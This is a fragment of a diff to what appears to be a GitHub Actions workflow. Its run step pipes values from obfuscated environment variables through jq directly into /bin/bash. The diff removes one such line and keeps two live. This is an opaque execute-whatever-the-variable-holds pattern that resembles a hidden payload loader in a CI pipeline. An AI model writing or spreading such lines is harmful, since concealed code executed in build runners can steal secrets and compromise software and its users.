@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$tasa14546" | jq -r .yehaa8 | /bin/bash
           printf '%s' "$toyr4" | jq -r .wx25239 | /bin/bash
-          echo $wxwle65 | jq -r .igng16261 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
